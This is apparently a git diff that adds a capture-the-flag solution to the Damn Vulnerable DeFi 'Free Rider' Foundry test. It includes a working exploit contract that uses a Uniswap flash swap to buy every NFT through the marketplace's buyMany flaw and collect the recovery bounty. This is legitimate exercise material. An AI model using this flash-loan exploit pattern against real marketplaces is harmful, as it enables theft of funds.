@@ -63,6 +63,7 @@ contract FreeRiderChallenge is Test {
             deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
         );
 
+        
         token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
         uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
             address(token), // token to be traded against WETH
@@ -124,6 +125,11 @@ contract FreeRiderChallenge is Test {
      */
     function test_freeRider() public checkSolvedByPlayer {
         
+        console.log("weth: ", address(weth));
+        console.log("token 0: ", uniswapPair.token0());
+        ExploitFeeRider exploitFeeRider = new ExploitFeeRider(address(marketplace),address( recoveryManager), nft, weth);
+        exploitFeeRider.attack(uniswapPair, NFT_PRICE); 
+         
     }
 
     /**
@@ -144,5 +150,61 @@ contract FreeRiderChallenge is Test {
         // Player must have earned all ETH
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
+    }
+}
+
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+contract ExploitFeeRider is IERC721Receiver{
+    address owner;
+    address marketplace;
+     address recoveryManager;
+
+    DamnValuableNFT nft;
+    WETH weth;
+
+    IUniswapV2Pair uniswapPair;
+
+    constructor( address _marketplace, address _recoveryManager, DamnValuableNFT _nft, WETH _weth) {
+        owner  = msg.sender;
+       marketplace = _marketplace;
+       recoveryManager =_recoveryManager;
+       nft = _nft;
+       weth = _weth;
+    }
+
+    function attack(IUniswapV2Pair _uniswapPair, uint256 amount0Out) payable public {
+        uniswapPair =  _uniswapPair;
+        uint256 AMOUNT_OF_NFTS = 6;
+        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            ids[i] = i;
+        }
+
+        bytes memory data = abi.encodeCall(FreeRiderNFTMarketplace.buyMany, (ids));
+        uniswapPair.swap(amount0Out, 0, address(this), data );
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0Out, uint256 amount1Out, bytes memory data) public {        
+        weth.withdraw(amount0Out);                   
+        marketplace.call{value:amount0Out}(data);
+        nft.setApprovalForAll(address(recoveryManager), true);
+        for (uint i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this),recoveryManager, i, abi.encodePacked(bytes32(uint256(uint160(owner)))));
+        }
+
+        weth.deposit{value: amount0Out + amount0Out* 30/ 1000}();          
+        weth.transfer(address(uniswapPair), amount0Out+ amount0Out* 30/ 1000);
+
+    }
+    receive() external payable {
+    }
+
+   function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
